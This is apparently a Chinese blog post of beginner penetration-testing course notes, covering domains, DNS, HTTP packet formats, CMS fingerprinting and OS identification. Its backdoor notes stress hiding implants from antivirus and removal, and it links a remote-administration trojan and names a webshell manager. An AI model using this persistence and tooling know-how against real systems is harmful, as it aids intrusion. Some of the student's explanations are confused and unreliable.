



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
<meta name="msvalidate.01" content="9EBC90696DDD6D995901F1695D5C0A38" />
<meta name="baidu-site-verification" content="codeva-kMcy1s0JgQ" />
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="简单の博客" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="简单の博客" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="简单の博客" href="http://example.com/feed.json" />
<meta name="Keywords" Content="">
<meta name="Description" Content="">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://example.com/2023/06/01/%E5%B0%8F%E8%BF%AA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">



  <title>简单の博客</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">小迪网络安全
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2023-06-01 16:05:04">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2023-06-01T16:05:04+08:00">2023-06-01</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">hello world</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://image.baidu.com/search/down?url=https://lz.sinaimg.cn/large/6833939bly1giclimtf7dj20zk0m8qav.jpg"></li>
          <li class="item" data-background-image="https://image.baidu.com/search/down?url=https://lz.sinaimg.cn/large/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li>
          <li class="item" data-background-image="https://image.baidu.com/search/down?url=https://lz.sinaimg.cn/large/6833939bly1giciub8ja1j20zk0m81ky.jpg"></li>
          <li class="item" data-background-image="https://image.baidu.com/search/down?url=https://lz.sinaimg.cn/large/6833939bly1gicli9lfebj20zk0m84qp.jpg"></li>
          <li class="item" data-background-image="https://image.baidu.com/search/down?url=https://lz.sinaimg.cn/large/6833939bly1gipexw3o58j20zk0m8e81.jpg"></li>
          <li class="item" data-background-image="https://image.baidu.com/search/down?url=https://lz.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg"></li>
        </ul>
      </div>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    </header>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/01/%E5%B0%8F%E8%BF%AA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">

<span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="https://avatars.githubusercontent.com/u/116647725?s=400&u=c1d12fb27b36682d1ce63e666ba3ed2684c6cc3c&v=4">
  <meta itemprop="name" content="Kobe_">
  <meta itemprop="description" content="我喜欢老歌老朋友和一直爱我的人, ">
</span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="简单の博客">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <p>24天基础内容笔记<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hF0sNnZbqnNfSqzZlzYsmA">XD安全 学习笔记 | 基础阶段24天 (qq.com)</a></p>
<p>xss阶段<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/QsXAfrD0rjpeO9ZBCfxr4g">XD安全渗透 学习笔记 | XSS漏洞阶段 (qq.com)</a></p>
<p>csrf和ssrf阶段<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YH9V_NVdyoQHU69AqY55cQ">XD安全渗透 学习笔记 | CSRF-SSRF阶段 (qq.com)</a></p>
<p>文件包含阶段<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/uDm0QdtDlqFDoYja8ogBxg">XD安全 学习笔记 | 文件包含 (qq.com)</a></p>
<p>逻辑越权：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3M_-1k-H6Jow5Iyw5JSggw">XD安全 学习笔记 | 逻辑漏洞 (qq.com)</a></p>
<p>反序列化与XXE：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Jf5ZTP3PSMZ2gbBr_3E_ew">XD安全 学习笔记 | 反序列化与XXE (qq.com)</a></p>
<p>Java安全：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WlyeZvFxHZCmPQ8ToMjt4g">XD安全 学习笔记 | Java (qq.com)</a></p>
<p>系统bug发现：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/NsFS57XRyav7wlYupUNbXA">XD安全 学习笔记 | 系统BUG发现 (qq.com)</a></p>
<p>WAF绕过：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_IdtDUxPHOVxLoQiGkoaAw">微信公众平台 (qq.com)</a></p>
<p>代码审计：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/0dRy939dZUT5NyLPVdULkw">XD安全 学习笔记 | 代码审计 (qq.com)</a></p>
<p>提权和内网（五篇文章）：</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YJHPlRBEz1rYHrOjAIZvkQ">XD安全渗透测试课程 学习笔记 | 提权阶段 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hOSMACmtj5ivkECYf5U7kQ">微信公众平台 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ymnB-del9PASKMK6Vn5xTg">XD安全渗透测试课程 学习笔记 | 内网渗透(二) (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ww07lccTo00F7wMWNd5r2g">微信公众平台 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/q7doveTh-p_a26YF73Z91w">微信公众平台 (qq.com)</a></p>
<p>73-75  应急响应：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3EW1Ecbjb2ZC7hTMOYivmQ">XD安全 学习笔记 | 应急响应 (qq.com)</a></p>
<p>76-79 python安全开发：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CvnSzqzpvtqQL10f_28kdw">XD安全 学习笔记 | python安全开发 (qq.com)</a></p>
<p>80-82 红蓝对抗：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/k4xswvDYfoB9Gsb4qKNVhA">XD安全 渗透测试笔记 | 红蓝对抗 (qq.com)</a></p>
<p>83-85 CTF夺旗赛：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/U4K1usp3E3s10eigzJBj2A">XD安全 学习笔记 | CTF夺旗 (qq.com)</a></p>
<p>SRC漏洞挖掘：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yZ7vws-XgeOYS0tu_gEAjw">XD安全 学习笔记 | SRC漏洞挖掘经验 (qq.com)</a></p>
<h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>什么是域名：网站地址</p>
<p>域名怎么注册 阿里云注册（国内） </p>
<p>二级域名 多级域名   没懂</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;www.example.com&quot; 是一个三级域名，其中 &quot;com&quot; 是顶级域名，&quot;example&quot; 是二级域名，&quot;www&quot; 是三级域名。多级域名的层级可以根据需求进行扩展，用于更细分和组织网站的不同功能、服务或部门。</span><br></pre></td></tr></table></figure>

<p>域名对网络安全作用  每一个多级域名就是一个网页，通过有漏洞的网页渗透到更过权限和内容</p>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>互联网上的一种分布式命名系统，用于将域名（例如example.com）转换为对应的IP地址</p>
<p>dns 域名系统（服务）协议 ： 通过域名解析到地址</p>
<p>本地host 和dns区别  host 是电脑中保存的域名和地址 目录，同样也可以自己设置 </p>
<p>cdn和dns关系  cdn（内容分发网络）在网络基础上的虚拟网络  通过就近服务器获取所需内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.用户发送请求到最近的边缘节点。</span><br><span class="line">2.边缘节点检查是否已缓存请求的内容。如果有缓存，边缘节点可以直接响应请求，而无需进一步的转发。</span><br><span class="line">3.如果边缘节点没有缓存所需的内容，它将转发请求到源服务器（即目标服务器）。</span><br><span class="line">4.源服务器接收到请求并响应边缘节点。</span><br><span class="line">5.边缘节点将响应返回给用户。</span><br><span class="line"></span><br><span class="line">请求会经过多个网络节点，包括骨干网络、边缘节点和其他中间网络。这些节点根据路由算法将请求从一个节点传输到另一个节点，直到达到目标服务器所在的网络</span><br><span class="line"></span><br><span class="line">如果边缘节点没有缓存所需的内容，它通常无法直接响应请求，而是需要进一步将请求转发给源服务器</span><br><span class="line">没有缓存内容的情况下，它们需要与源服务器进行交互以获取所需的内容</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;工具网站 超级ping&#x3D;&#x3D;</p>
<h3 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h3><p>哪些语言 ：  php  python  javaweb </p>
<p>不同脚本类型与漏洞区别：  </p>
<p>漏洞挖掘代码审计和脚本类型的关系：</p>
<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>什么是后门：统称  方便下次进来  相当于管道  网站后门，服务器后门 </p>
<p>后门实际意义: 目的是更好隐藏控制机器</p>
<p>玩法 （免杀）后门不被发现 不被删除</p>
<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>wen组成： </p>
<p>  1.网站源码  脚本类型  分应用方向</p>
<ol start="2">
<li><p>操作系统 windows linux </p>
</li>
<li><p>中间件（搭建平台）  apache  iis  tomacat  nginx </p>
<p>只有源码时运行不起来的，但是有中间件 可以使网站运行起来</p>
</li>
<li><p>数据库  access  mysql  oracle</p>
</li>
</ol>
<p>架构漏洞安全测试简要介绍： </p>
<p>为什么一web层次为主： 因为web层次应用的广，漏洞多，操作系统漏洞少，而且漏洞很可能是没危害</p>
<h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h3><p>web 源码类对应的漏洞： SQL注入  文件上传  xss  代码执行  逻辑漏洞  反系列化</p>
<p>中间件对应漏洞：  </p>
<p>数据库对应漏洞：  </p>
<p>web系统层漏洞：  </p>
<p>第三方对应漏洞：  </p>
<p>app或pc应用的结合类：  </p>
<h3 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h3><p>收集信息 </p>
<ol>
<li>多级域名枚举查询域名目录 <ol>
<li>工具爆破查询</li>
<li>域名注册查询</li>
<li>域名查询A记录 MX记录 CNANE记录</li>
</ol>
</li>
<li>DNS解析修改后分析 （本地或服务）</li>
<li>exe后们及危害及微博后门</li>
<li>app类结合web协议，pc类web协议结合</li>
</ol>
<h3 id="资源资源"><a href="#资源资源" class="headerlink" title="资源资源"></a>资源资源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://www.xyaz.cn           逍遥</span><br><span class="line">http://www.downcc.com/soft/11196.html    wsexplorer抓包工具</span><br><span class="line">https://github.com/quasar/QuasarRAT/releases   Quasar免费开源的Windows远程管理工具</span><br><span class="line"></span><br><span class="line">#如失效 不补.</span><br><span class="line">https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg提取码: 0b7b</span><br></pre></td></tr></table></figure>



<h2 id="第二天–数据包"><a href="#第二天–数据包" class="headerlink" title="第二天–数据包"></a>第二天–数据包</h2><h3 id="2-1-https-amp-http"><a href="#2-1-https-amp-http" class="headerlink" title="2.1 https&amp;http"></a>2.1 https&amp;http</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhXIlg9YwwunTBPXMx4t1mt2C8l7weq9clMMjm45fia4Gian0Q4Pl2Cceg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<ul>
<li>HTTPS协议需要到CA申请证书，一般免费证书很少，需要交费。</li>
<li>HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL&#x2F;TLS之上，SSL&#x2F;TLS运行在TCP之上，所有传输的内容都经过加密的。</li>
<li>HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，前者是<strong>80</strong>，后者是<strong>443</strong>。</li>
<li>HTTPS可以有效的防止运营商劫持，解决了防劫持的一个大问题。</li>
</ul>
<h3 id="2-2-Request-请求数据包数据格式"><a href="#2-2-Request-请求数据包数据格式" class="headerlink" title="2.2 Request 请求数据包数据格式"></a>2.2 Request 请求数据包数据格式</h3><h3 id="Request-Headers"><a href="#Request-Headers" class="headerlink" title="Request Headers"></a><strong>Request Headers</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /adduser HTTP/1.1 请求行</span><br><span class="line">Host: localhost:8030</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>

<p><strong>Form Data</strong></p>
<ul>
<li>name&#x3D;name&amp;age&#x3D;11</li>
</ul>
<h3 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a><strong>请求行</strong></h3><ul>
<li>请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。</li>
<li>例如：GET &#x2F;index.html HTTP&#x2F;1.1</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP 规划定义了 8 种可能的请求方法：</span><br><span class="line">GET：检索 URL 中标识资源的一个简单请求</span><br><span class="line">HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档</span><br><span class="line">POST：服务器接受被写入客户端输出流中的数据的请求</span><br><span class="line">PUT：服务器保存请求数据作为指定 URL 新内容的请求</span><br><span class="line">DELETE：服务器删除 URL 中命令的资源的请求</span><br><span class="line">OPTIONS：关于服务器支持的请求方法信息的请求</span><br><span class="line">TRACE：web 服务器反馈 Http 请求和其头标的请求</span><br><span class="line">CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AWD模式</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a><strong>请求头</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</span><br><span class="line">HOST: 主机或域名地址</span><br><span class="line">Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格</span><br><span class="line">式。</span><br><span class="line">User-Agent：是客户浏览器名称</span><br><span class="line">Host：对应网址 URL 中的 Web 名称和端口号。</span><br><span class="line">Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。</span><br><span class="line">connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive</span><br><span class="line">为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立</span><br><span class="line">连接</span><br><span class="line">Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载</span><br><span class="line">和服务器相关的用户信息，也可以用来实现会话功能。</span><br><span class="line">Referer ： 表 明 产 生 请 求 的 网 页 URL 。 如 比 从 网 页 /icconcept/index.jsp 中 点 击 一 个 链 接 到 网 页</span><br><span class="line">/icwork/search ， 在 向 服 务 器 发 送 的 GET/icwork/search 中 的 请 求 中 ， Referer 是</span><br><span class="line">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪 Web 请求是从什么网站来的。</span><br><span class="line">Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。</span><br><span class="line">Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.</span><br><span class="line">Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加</span><br><span class="line">速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</span><br></pre></td></tr></table></figure>

<p><strong>空行</strong></p>
<ul>
<li><p>最后一个请求头标之后是空行，发送回车符和退行，</p>
<p>空行的存在使得请求头和请求体能够被准确地区分开来</p>
</li>
</ul>
<h3 id="请求体"><a href="#请求体" class="headerlink" title="请求体"></a><strong>请求体</strong></h3><ul>
<li>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</li>
</ul>
<h3 id="2-3-Response-返回数据包数据格式"><a href="#2-3-Response-返回数据包数据格式" class="headerlink" title="2.3 Response 返回数据包数据格式"></a>2.3 Response 返回数据包数据格式</h3><p><strong>Response 请求数据包数据格式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</span><br><span class="line">1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</span><br><span class="line">2.响应头标：包含服务器类型、日期、长度、内容类型等</span><br><span class="line">3.空行：响应头与响应体之间用空行隔开</span><br><span class="line">4.响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</span><br></pre></td></tr></table></figure>

<p><strong>HTTP 响应码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1xx：信息，请求收到，继续处理</span><br><span class="line">2xx：成功，行为被成功地接受、理解和采纳</span><br><span class="line">3xx：重定向，为了完成请求，必须进一步执行的动作</span><br><span class="line">4xx：客户端错误</span><br><span class="line">5xx：服务器错</span><br></pre></td></tr></table></figure>



<h3 id="x3D-x3D-思考题-x3D-x3D"><a href="#x3D-x3D-思考题-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;思考题&#x3D;&#x3D;"></a>&#x3D;&#x3D;思考题&#x3D;&#x3D;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">电脑中，当运行phpstudy时 localhost就代表电脑访问www文件夹，</span><br><span class="line">在www文件夹里面我呢们可以部署子网站， </span><br><span class="line">在浏览器中 ，我们访问www.baidu.com时 就相当于访问www.bilibili.com 或者是localhost</span><br><span class="line">localhost和ww.baidu.com和ww.bilibili.com都是主域名</span><br><span class="line">子域名是指在主域名前面创建的更小的子集域名，它通常用于将特定部分的网站内容分配给不同的子部分。例如 </span><br><span class="line">在URL中，路径部分用于标识网站的不同页面或资源。路径部分通常以斜杠（/）开头，用于定位网站的不同目录或文件。</span><br></pre></td></tr></table></figure>

<h3 id="x3D-x3D-资源资源-x3D-x3D"><a href="#x3D-x3D-资源资源-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;资源资源&#x3D;&#x3D;"></a>&#x3D;&#x3D;资源资源&#x3D;&#x3D;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">超级ping     没用</span><br><span class="line"></span><br><span class="line">在线靶场 www.mozhe.cn  要钱</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="第三天–-搭建安全拓展"><a href="#第三天–-搭建安全拓展" class="headerlink" title="第三天– 搭建安全拓展"></a>第三天– 搭建安全拓展</h2><blockquote>
<p>域名扫描只能扫描出来域名文件，而域名文件只是占服务器资源的一小部分；IP扫描可以直接扫描出来服务器的根目录，得到的信息更多；</p>
</blockquote>
<h3 id="3-1-网站搭建环境"><a href="#3-1-网站搭建环境" class="headerlink" title="3.1 网站搭建环境"></a>3.1 网站搭建环境</h3><ul>
<li>ASP,PHP,ASPX,JSP,PY,JAVA WEB 等环境</li>
</ul>
<p><strong>WEB 源码中敏感文件</strong></p>
<ul>
<li>后台路径，数据库配置文件，备份文件等</li>
</ul>
<h3 id="3-2-基于中间件的简要识别"><a href="#3-2-基于中间件的简要识别" class="headerlink" title="3.2 基于中间件的简要识别"></a>3.2 基于中间件的简要识别</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhILr30U0H2KtZWCeUpeicSJl4WCTz22I9hzNfW9Jaj6Vbw5gzeuhJJ9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h3 id="3-3-后门注意事项"><a href="#3-3-后门注意事项" class="headerlink" title="3.3 后门注意事项"></a>3.3 后门注意事项</h3><ul>
<li>后门是否给予执行权限</li>
<li>后门是否给予操作目录或文件权限</li>
<li>后门是否给予其他用户权限</li>
</ul>
<h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><blockquote>
<p>中国蚁剑</p>
</blockquote>
<h3 id="资源资源-1"><a href="#资源资源-1" class="headerlink" title="资源资源"></a>资源资源</h3><p>vnlhub单独漏洞的复现</p>
<p>vnlnhub完整漏洞</p>
<h2 id="第四天–WEB-源码拓展"><a href="#第四天–WEB-源码拓展" class="headerlink" title="第四天–WEB 源码拓展"></a>第四天–WEB 源码拓展</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><blockquote>
<p>WEB 源码在安全测试中是非常重要的信息来源，可以用来<strong>代码审计</strong>漏洞也可以用来做信息突破口，其中 WEB 源码有很多技术需要简明分析。</p>
</blockquote>
<h3 id="4-1-知识点"><a href="#4-1-知识点" class="headerlink" title="4.1 知识点"></a>4.1 知识点</h3><ul>
<li>关于 WEB 源码目录结构</li>
<li>关于 WEB 源码脚本类型</li>
<li>关于 WEB 源码应用分类</li>
<li>关于 WEB 源码其他说明</li>
</ul>
<h3 id="4-2-x3D-x3D-信息敏感点-x3D-x3D"><a href="#4-2-x3D-x3D-信息敏感点-x3D-x3D" class="headerlink" title="4.2 &#x3D;&#x3D;信息敏感点&#x3D;&#x3D;"></a>4.2 &#x3D;&#x3D;信息敏感点&#x3D;&#x3D;</h3><ul>
<li>敏感目录结构：数据库配置文件，后台目录，模版目录，数据库目录等</li>
<li>web脚本类型：ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码</li>
<li>应用分类：社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</li>
<li>开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等</li>
<li>关于源码获取的相关途径：搜索，咸鱼淘宝，第三方源码站 &#x3D;&#x3D;源码之家&#x3D;&#x3D;</li>
</ul>
<blockquote>
<p>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicy3sln0zHKTBrAacxk8bMhGN91ibYoovfSZZoWuePib31lSfGYqFYNibFCQG84oojdpWmw2IOpY8iaFQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>style.css：这个文件可以用来生成md5值来查寻cms框架。可以通过网页刷新时加载的文件来搜索cms。</p>
</blockquote>
<h3 id="资源资源-2"><a href="#资源资源-2" class="headerlink" title="资源资源"></a>资源资源</h3><p><a target="_blank" rel="noopener" href="https://www.yunsee.cn/">https://www.yunsee.cn</a>  cms识别（网络资产更清晰）</p>
<p> <a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a>  cms识别</p>
<p> <a target="_blank" rel="noopener" href="https://w.ddosi.workers.dev/">https://w.ddosi.workers.dev</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a>  cms库</p>
<p><a target="_blank" rel="noopener" href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a></p>
<p> <a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a>     [Web安全学习笔记]</p>
<h2 id="第五天–系统-amp-数据库"><a href="#第五天–系统-amp-数据库" class="headerlink" title="第五天–系统&amp;数据库"></a>第五天–系统&amp;数据库</h2><p>在这里插入图片描述</p>
<h3 id="5-1-操作系统层面"><a href="#5-1-操作系统层面" class="headerlink" title="5.1 操作系统层面"></a>5.1 操作系统层面</h3><p><strong>识别操作系统常见方法</strong></p>
<ul>
<li>看字母大小写，windows对大小写不敏感，Linux敏感</li>
<li>看ping值 –ttl在64左右，linux –ttl在128左右windows</li>
<li>nmap -O ip</li>
</ul>
<p><strong>简要两者区别及识别意义情况</strong></p>
<ul>
<li>可以帮助我们明确思路</li>
